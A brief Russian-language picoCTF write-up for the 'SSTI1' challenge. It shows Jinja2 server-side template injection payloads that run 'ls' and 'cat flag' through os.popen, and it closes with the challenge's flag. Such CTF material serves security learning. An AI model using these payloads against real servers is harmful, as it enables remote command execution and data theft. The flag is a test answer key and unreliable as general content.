# Задание SSTI1

Исследуя Python SSTI, я обнаружил отличный пост [**OnSecurity**](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) здесь подробно описаны различные способы полезной нагрузки. Например, выполняется следующая полезная нагрузка ls в том же каталоге, что и сервер (рис 1)\
\{\{request.application.\_\_globals\_\_.\_\_builtins\_\_\_.\_\_import\_\_(\'os\').popen(\'ls\').read()\}\}

![img](media/Задание_SSTI1/media/image1.png)

Пробуем переделать payload для запуска cat flag (рис 2):\
\{\{request.application.\_\_globals\_\_.\_\_builtins\_\_.\_\_import\_\_(\'os\').popen(\'cat flag\').read()\}\}

![img](media/Задание_SSTI1/media/image2.png)

## **ОТВЕТ: picoCTF\{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04\}**

